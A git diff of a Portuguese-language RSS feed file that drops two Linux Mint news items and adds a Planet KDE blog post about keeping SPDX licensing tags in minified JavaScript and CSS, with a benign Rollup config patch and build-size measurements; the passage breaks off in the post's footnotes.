@@ -13,7 +13,7 @@
     <language>pt-BR</language>
     <copyright>Conteúdo de propriedade de cada fonte original</copyright>
     <managingEditor>libreufop@ufop.edu.br</managingEditor>
-    <lastBuildDate>Thu, 02 Jul 2026 21:07:06 -0000</lastBuildDate>
+    <lastBuildDate>Thu, 02 Jul 2026 23:09:50 -0000</lastBuildDate>
     <ttl>60</ttl>
     <atom:link href="https://SEU_USUARIO_OU_ORG.github.io/SEU_REPO/feed.xml" rel="self" type="application/rss+xml"/>
 
@@ -591,14 +591,6 @@ individual.&lt;/p&gt;
       <source url="https://github.com/hyprwm/Hyprland/releases.atom">Hyprland</source>
     </item>
     <item>
-      <title>[Linux Mint Blog] Monthly News – January 2026</title>
-      <link>https://blog.linuxmint.com/?p=4991</link>
-      <description>Hi everyone, Before we start with the news, I&amp;#8217;d like to thank you for your donations and for your support! We received donations from more than a thousand people in December! I know I talked about this before, but I&amp;#8217;ll do it again because this number of donors in a single month is unprecedented. I [&amp;#8230;]</description>
-      <pubDate>Wed, 11 Feb 2026 15:36:15 -0000</pubDate>
-      <guid isPermaLink="false">https://blog.linuxmint.com/?p=4991</guid>
-      <source url="https://blog.linuxmint.com/?feed=rss2">Linux Mint Blog</source>
-    </item>
-    <item>
       <title>[OSI] From G7’s Vision on AI Openness to EU’s Tech Sovereignty Package</title>
       <link>https://opensource.org/blog/from-g7s-vision-on-ai-openness-to-eus-tech-sovereignty-package</link>
       <description>Members Newsletter – June 2026
@@ -616,14 +608,6 @@ If you look at the G7’s Vision on AI Openness or the European Union’s Tech S
       <source url="https://github.com/i3/i3/releases.atom">i3wm</source>
     </item>
     <item>
-      <title>[Linux Mint Blog] Monthly News – February 2026</title>
-      <link>https://blog.linuxmint.com/?p=5010</link>
-      <description>Hi everyone, First of all, thank you for your support and your donation! And many thanks to all the people involved in helping Linux Mint. Here&amp;#8217;s a preview of what we worked on recently, and which will be featured in the next release. Sensors A page dedicated to sensors was added to the System Reports [&amp;#8230;]</description>
-      <pubDate>Wed, 04 Mar 2026 15:01:31 -0000</pubDate>
-      <guid isPermaLink="false">https://blog.linuxmint.com/?p=5010</guid>
-      <source url="https://blog.linuxmint.com/?feed=rss2">Linux Mint Blog</source>
-    </item>
-    <item>
       <title>[Diolinux] O alerta do BIS: a bolha da IA pode estourar e arrastar a economia global</title>
       <link>https://diolinux.com.br/noticias/o-alerta-do-bis-a-bolha-da-ia.html</link>
       <description>O Banco de Compensações Internacionais (BIS) alerta que os investimentos bilionários em IA podem formar uma bolha semelhante à da internet nos anos 2000, com riscos para toda a economia mundial.</description>
@@ -639,6 +623,122 @@ If you look at the G7’s Vision on AI Openness or the European Union’s Tech S
       <pubDate>Wed, 01 Jul 2026 22:35:00 -0000</pubDate>
       <guid isPermaLink="false">https://www.omgubuntu.co.uk/?p=333876</guid>
       <source url="https://www.omgubuntu.co.uk/feed">OMG! Ubuntu</source>
+    </item>
+    <item>
+      <title>[Planet KDE] Persistent copyright &amp; licensing information in client-side JavaScript, CSS and similar – feedback and second proposal</title>
+      <link>https://matija.suklje.name/persistent-copyright-licensing-information-in-client-side-javascript-css-and-similar-feedback-and-second-proposal</link>
+      <description>&lt;p&gt;At &lt;strong&gt;&lt;abbr title=&quot;Free &amp;amp; Open Source Software Developers’ European Meeting&quot;&gt;FOSDEM&lt;/abbr&gt; 2025&lt;/strong&gt; I presented my (intentionally controversial) &lt;a href=&quot;https://matija.suklje.name/persistent-copyright-licensing-information-in-client-side-javascript-css-and-similar-a-proposal-call-for-help&quot; target=&quot;_blank&quot;&gt;proposal how to keep copyright and licensing info in minified &lt;abbr title=&quot;JavaScript&quot;&gt;JS&lt;/abbr&gt;/&lt;abbr title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/abbr&gt;&lt;/a&gt; and asked for feedback, including from &lt;em&gt;front-end developers&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Two months later, I took the feedback from &lt;abbr title=&quot;Free &amp;amp; Open Source Software Developers’ European Meeting&quot;&gt;FOSDEM&lt;/abbr&gt; and held a small workshop session with a group consisting of &lt;em&gt;OSPO leaders&lt;/em&gt;, &lt;em&gt;&lt;abbr title=&quot;Free &amp;amp; Open Source Software&quot;&gt;FOSS&lt;/abbr&gt; lawyers&lt;/em&gt; and a handful of &lt;abbr title=&quot;Free &amp;amp; Open Source Software&quot;&gt;FOSS&lt;/abbr&gt; developers at &lt;strong&gt;&lt;abbr title=&quot;(Free Software) Legal &amp;amp; Licensing Workshop&quot;&gt;LLW&lt;/abbr&gt; 2025&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;This blog post was finished&lt;sup id=&quot;fnref:sorry&quot;&gt;&lt;a class=&quot;footnote-ref&quot; href=&quot;https://planet.kde.org/index.xml#fn:sorry&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; more than a year after both, so I will not be summarizing my &lt;a href=&quot;https://fosdem.org/2025/schedule/event/fosdem-2025-5313-persistent-copyright-licensing-information-in-client-side-js-css-sim-proposal-/&quot; target=&quot;_blank&quot;&gt;&lt;abbr title=&quot;Free &amp;amp; Open Source Software Developers’ European Meeting&quot;&gt;FOSDEM&lt;/abbr&gt; talk&lt;/a&gt;, and suggest you listen to it (esp. the &lt;abbr title=&quot;Questions &amp;amp; Answers&quot;&gt;Q&amp;amp;A&lt;/abbr&gt; part), if you are interested in the details.&lt;/p&gt;
+&lt;p&gt;But I will summarize the results of both sessions below.&lt;/p&gt;
+&lt;h1 id=&quot;are-sdpx-ids-enough-for-compliance-or-not-given-their-templating&quot;&gt;Are SDPX IDs enough for compliance or not (given their templating)&lt;a class=&quot;headerlink&quot; href=&quot;https://planet.kde.org/index.xml#are-sdpx-ids-enough-for-compliance-or-not-given-their-templating&quot; title=&quot;Permanent link&quot;&gt;¶&lt;/a&gt;&lt;/h1&gt;
+&lt;p&gt;Someone argued that for certain licenses – specifically, e.g. the MIT and BSD family – even the &lt;a href=&quot;https://spdx.org/licenses/&quot; target=&quot;_blank&quot;&gt;&lt;abbr title=&quot;Software Package Data Exchange&quot;&gt;SPDX&lt;/abbr&gt; License List&lt;/a&gt; has a some templating in place, and as such identifying it with just an &lt;abbr title=&quot;Software Package Data Exchange&quot;&gt;SPDX&lt;/abbr&gt; ID would not fulfil the license obligations, by strict reading of the license.&lt;/p&gt;
+&lt;p&gt;That is a concern that I identified already in my &lt;a href=&quot;https://matija.suklje.name/persistent-copyright-licensing-information-in-client-side-javascript-css-and-similar-a-proposal-call-for-help#is-this-really-enough&quot; target=&quot;_blank&quot;&gt;original proposal&lt;/a&gt; and I agree that my proposed approach has a certain amount of “handwaving”, which is not 100% risk-proof.&lt;/p&gt;
+&lt;p&gt;(Spoiler: we fix this issue in the final proposal. Wait for the next blog post in this series.)&lt;/p&gt;
+&lt;h1 id=&quot;impact-on-size-of-the-minifed-code&quot;&gt;Impact on size of the minifed code&lt;a class=&quot;headerlink&quot; href=&quot;https://planet.kde.org/index.xml#impact-on-size-of-the-minifed-code&quot; title=&quot;Permanent link&quot;&gt;¶&lt;/a&gt;&lt;/h1&gt;
+&lt;p&gt;A common concern from web developers was how much keeping the &lt;abbr title=&quot;Software Package Data Exchange&quot;&gt;SPDX&lt;/abbr&gt;/REUSE tags in the minified code would impact the its size.&lt;/p&gt;
+&lt;p&gt;With the help of the wonderful &lt;a href=&quot;https://github.com/lukastaegert&quot; target=&quot;_blank&quot;&gt;Lukas Taegert-Atkinson&lt;/a&gt; of &lt;a href=&quot;https://rollupjs.org/&quot; target=&quot;_blank&quot;&gt;Rollup&lt;/a&gt; fame, we managed to get a good idea what the impact adding REUSE/&lt;abbr title=&quot;Software Package Data Exchange&quot;&gt;SPDX&lt;/abbr&gt; tags to all the files would have on the size of the minified code.&lt;/p&gt;
+&lt;p&gt;As an &lt;abbr title=&quot;Proof of Concept&quot;&gt;PoC&lt;/abbr&gt; Lukas made the following change to the build process of &lt;a href=&quot;https://www.npmjs.com/package/@rollup/browser&quot; target=&quot;_blank&quot;&gt;Rollup Browser&lt;/a&gt;, so we could compare the size of the minified code before and after the diff.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;diff --git a/rollup.config.ts b/rollup.config.ts&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class=&quot;gd&quot;&gt;--- a/rollup.config.ts (revision 384d5333fbc3d8918b41856822376da2a65ccaa3)&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+++ b/rollup.config.ts (date 1742569205307)&lt;/span&gt;
+&lt;span class=&quot;gu&quot;&gt;@@ -152,7 +152,22 @@&lt;/span&gt;
+&lt;span class=&quot;w&quot;&gt; &lt;/span&gt; collectLicensesBrowser(),
+&lt;span class=&quot;w&quot;&gt; &lt;/span&gt; writeLicenseBrowser(),
+&lt;span class=&quot;w&quot;&gt; &lt;/span&gt; cleanBeforeWrite(&apos;browser/dist&apos;),
+&lt;span class=&quot;gd&quot;&gt;- emitWasmFile()&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+ emitWasmFile(),&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+ &amp;#123;&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+ name: &apos;add-fake-tags&apos;,&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+ transform(code) &amp;#123;&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+ return &amp;#123;&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+ code: `/*!&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+* SPDX-SnippetBegin&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+* SPDX-SnippetCopyrightText: © 2021 Test Dummy &amp;lt;dummy@test.example&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+* SPDX-License-Identifier: BSD-2-Clause&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+*/&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+$&amp;#123;code}&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+/*! SPDX-SnippetEnd */`,&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+ map: &amp;#123; mappings: &apos;&apos; }&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+ };&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+ }&lt;/span&gt;
+&lt;span class=&quot;gi&quot;&gt;+ }&lt;/span&gt;
+&lt;span class=&quot;w&quot;&gt; &lt;/span&gt; ],
+&lt;span class=&quot;w&quot;&gt; &lt;/span&gt; strictDeprecations: true,
+&lt;span class=&quot;w&quot;&gt; &lt;/span&gt; treeshake
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If Rollup Browser was built as per default, the full minified code resulted in &lt;strong&gt;374 &lt;abbr title=&quot;kibibyte (1024 bytes)&quot;&gt;KiB&lt;/abbr&gt;&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;After the patch that caused (dummy) snippet-level &lt;abbr title=&quot;Software Package Data Exchange&quot;&gt;SPDX&lt;/abbr&gt; tags to be inserted into all the code (Rollup itself and its dependencies), the size grew to &lt;strong&gt;415 &lt;abbr title=&quot;kibibyte (1024 bytes)&quot;&gt;KiB&lt;/abbr&gt;&lt;/strong&gt; though.&lt;/p&gt;
+&lt;p&gt;That is a &lt;strong&gt;11%&lt;/strong&gt; increase in size. Not exactly negligible, but definitely far from terrible. And if tooling were to be updated, with de-duplication we could possibly take that number down quite a bit too.&lt;/p&gt;
+&lt;p&gt;In the previous tiny &lt;a href=&quot;https://matija.suklje.name/persistent-copyright-licensing-information-in-client-side-javascript-css-and-similar-a-proposal-call-for-help#svelte-rollup-terser&quot; target=&quot;_blank&quot;&gt;Svelte + Rollup + Terser&lt;/a&gt; &lt;abbr title=&quot;Proof of Concept&quot;&gt;PoC&lt;/abbr&gt;, both with and without &lt;abbr title=&quot;Software Package Data Exchange&quot;&gt;SPDX&lt;/abbr&gt; tags are 12 &lt;abbr title=&quot;kibibyte (1024 bytes)&quot;&gt;KiB&lt;/abbr&gt;, so we need take a magnifying glass to compare 12.681 bytes with tags, and 12.324 bytes without them – that is just a &lt;strong&gt;3%&lt;/strong&gt; difference.&lt;/p&gt;
+&lt;p&gt;And in the previous &lt;a href=&quot;https://matija.suklje.name/persistent-copyright-licensing-information-in-client-side-javascript-css-and-similar-a-proposal-call-for-help#react-scripts-webpack-terser&quot; target=&quot;_blank&quot;&gt;React Scripts (+ WebPack + Terser)&lt;/a&gt; &lt;abbr title=&quot;Proof of Concept&quot;&gt;PoC&lt;/abbr&gt;, the overall build size is virtually unchanged, but oddly enough while some files become bigger, others become smaller.&lt;/p&gt;
+&lt;p&gt;With REUSE tags, the total size of &lt;code&gt;build/static/&lt;/code&gt; is 536 &lt;abbr title=&quot;kibibyte (1024 bytes)&quot;&gt;KiB&lt;/abbr&gt; (specifically, 531.070 bytes):&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;build/static/css:
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;.038&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:54&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;main.05c219f8.css
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;.759&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:54&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;main.05c219f8.css.map
+build/static/js:
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;.534&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:54&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;453&lt;/span&gt;.2a77899f.chunk.js
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt;.597&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:54&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;453&lt;/span&gt;.2a77899f.chunk.js.map
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;143&lt;/span&gt;.544&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:54&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;main.608edf8e.js
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;.205&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:54&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;main.608edf8e.js.LICENSE.txt
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;368&lt;/span&gt;.393&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:54&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;main.608edf8e.js.map
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;and without the &lt;abbr title=&quot;Software Package Data Exchange&quot;&gt;SPDX&lt;/abbr&gt; tags, the total size of &lt;code&gt;build/static/&lt;/code&gt; is also 536 &lt;abbr title=&quot;kibibyte (1024 bytes)&quot;&gt;KiB&lt;/abbr&gt; (specifically, 529.880 bytes):&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;build/static/css:
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;779&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:53&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;main.f855e6bc.css
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;.427&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:53&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;main.f855e6bc.css.map
+build/static/js:
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;.534&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:53&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;453&lt;/span&gt;.2a77899f.chunk.js
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt;.597&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:53&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;453&lt;/span&gt;.2a77899f.chunk.js.map
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;143&lt;/span&gt;.544&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:53&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;main.608edf8e.js
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;.070&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:53&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;main.608edf8e.js.LICENSE.txt
+.rw-r--r--&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;367&lt;/span&gt;.929&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hook&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;apr&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;01&lt;/span&gt;:53&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;main.608edf8e.js.map
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Which is a difference of measly &lt;strong&gt;0.2%&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Lukas was also quick to point out that a ballpark estimation of how much extra space this would take is quite easy to calculate, as all it is needed is to count all files that would be included in the final &lt;abbr title=&quot;JavaScript&quot;&gt;JS&lt;/abbr&gt; (or &lt;abbr title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/abbr&gt;) bundle and multiply that with the size of the &lt;abbr title=&quot;Software Package Data Exchange&quot;&gt;SPDX&lt;/abbr&gt; tags. As such, the impact would be bigger on projects that have many very short source code files, while smaller on those that have fewer, but longer source code files. Again, this is without taking any de-duplication into account.&lt;/p&gt;
+&lt;p&gt;So we can come up with a generic formula:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;size = normal_minified_size + (number_of_files × 4_extra_lines)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1 id=&quot;what-was-the-cause-of-the-problem-with-the-snippet-begin-and-snippet-end-tags&quot;&gt;What was the cause of the problem with the Snippet-Begin and Snippet-End tags?&lt;a class=&quot;headerlink&quot; href=&quot;https://planet.kde.org/index.xml#what-was-the-cause-of-the-problem-with-the-snippet-begin-and-snippet-end-tags&quot; title=&quot;Permanent link&quot;&gt;¶&lt;/a&gt;&lt;/h1&gt;
+&lt;p&gt;You may recall in my &lt;a href=&quot;https://matija.suklje.name/persistent-copyright-licensing-information-in-client-side-javascript-css-and-similar-a-proposal-call-for-help#react-scripts-webpack-terser&quot; target=&quot;_blank&quot;&gt;original proposal&lt;/a&gt; that there was an issue with the &lt;code&gt;SPDX-Snippet-Begin&lt;/code&gt; and &lt;code&gt;SPDX-Snippet-End&lt;/code&gt; tags being jumbled in the resulting minified code.&lt;/p&gt;
+&lt;p&gt;According to Lucas, this is most likely something Terser caused when associating comments to functions and then optimizing the code. He is fairly positive it can be solved though.&lt;/p&gt;
+&lt;p&gt;(Again, spoiler: this will be a moot issue in the end. Wait for the next blog post.)&lt;/p&gt;
+&lt;h1 id=&quot;do-we-need-tags-in-the-minified-code&quot;&gt;Do we need tags in the minified code?&lt;a class=&quot;headerlink&quot; href=&quot;https://planet.kde.org/index.xml#do-we-need-tags-in-the-minified-code&quot; title=&quot;Permanent link&quot;&gt;¶&lt;/a&gt;&lt;/h1&gt;
+&lt;p&gt;Of course, a very good question is &lt;strong&gt;whether we &lt;em&gt;need&lt;/em&gt; the REUSE/&lt;abbr title=&quot;Software Package Data Exchange&quot;&gt;SPDX&lt;/abbr&gt; tags in the minified code itself&lt;/strong&gt;. Especially, given that we do not require something as strict for other non-source code (e.g. compiled code).&lt;/p&gt;
+&lt;p&gt;I admit, I do not think we actually need to.&lt;/p&gt;
+&lt;p&gt;To be honest, why that is in the original proposal, is because I was trying to push just how far we can bring license compliance in client-side &lt;abbr title=&quot;JavaScript&quot;&gt;JS&lt;/abbr&gt;/&lt;abbr title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/abbr&gt; by just leveraging already existing standards and tools. It turns out we can push it &lt;em&gt;very far&lt;/em&gt; – arguably ad absurdum &lt;code&gt;;)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;So, no, I do not think we need that, but it was a good thought experiment and I think it was necessary to get discussion going&lt;sup id=&quot;fnref:hack&quot;&gt;&lt;a class=&quot;footnote-ref&quot; href=&quot;https://planet.kde.org/index.xml#fn:hack&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;h1 id=&quot;alternative-proposal-sbom&quot;&gt;Alternative proposal: &lt;abbr title=&quot;Software Bill of Material&quot;&gt;SBOM&lt;/abbr&gt;&lt;a class=&quot;headerlink&quot; href=&quot;https://planet.kde.org/index.xml#alternative-proposal-sbom&quot; title=&quot;Permanent link&quot;&gt;¶&lt;/a&gt;&lt;/h1&gt;
+&lt;p&gt;But if we do not keep it &lt;em&gt;in&lt;/em&gt; the code we ship, &lt;strong&gt;where do we keep the license/copyright info then&lt;/strong&gt;?&lt;/p&gt;
+&lt;p&gt;At &lt;abbr title=&quot;(Free Software) Legal &amp;amp; Licensing Workshop&quot;&gt;LLW&lt;/abbr&gt; 2025 we had a pretty intense session where ultimately we came up with an alternative proposal to &lt;strong&gt;generate an &lt;abbr title=&quot;Software Bill of Material&quot;&gt;SBOM&lt;/abbr&gt; and ship that instead&lt;/strong&gt;. This solves a lot of issues and is something that license compliance officers are already familiar with. It would also bring it closer to how we manage licensing when shipping non-web software.&lt;/p&gt;
+&lt;p&gt;The &lt;abbr title=&quot;Software Bill of Material&quot;&gt;SBOM&lt;/abbr&gt; approach would require use of tooling and by the end of the day we were left with a bunch of loose threads, but in general, this sounds like a good way forward.&lt;/p&gt;
+&lt;h1 id=&quot;conclusion-plan-b-in-the-making&quot;&gt;Conclusion: plan B in the making&lt;a class=&quot;headerlink&quot; href=&quot;https://planet.kde.org/index.xml#conclusion-plan-b-in-the-making&quot; title=&quot;Permanent link&quot;&gt;¶&lt;/a&gt;&lt;/h1&gt;
+&lt;p&gt;Was all the effort now wasted?&lt;/p&gt;
+&lt;p&gt;Not at all.&lt;/p&gt;
+&lt;p&gt;Web pages and (&lt;abbr title=&quot;Software as a Service&quot;&gt;SaaS&lt;/abbr&gt;) web applications are still a bit of a different beast, so we learned a lot in the past two years due to this exercise.&lt;/p&gt;
+&lt;p&gt;I am pretty confident we now have a way &lt;strong&gt;how to fulfil the license obligations&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;without making the web page too heavy;&lt;/li&gt;
+&lt;li&gt;burdening web developers any more than other programmers;&lt;/li&gt;
+&lt;li&gt;shipping machine-readable compliance artifacts; as well as&lt;/li&gt;
+&lt;li&gt;making the information ready for human consumption too.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In the next blog post I will present the final proposal.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;hook out → I think we’re slowly onto something …&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&quot;footnote&quot;&gt;
+&lt;hr /&gt;
+&lt;ol&gt;
+&lt;li id=&quot;fn:sorry&quot;&gt;
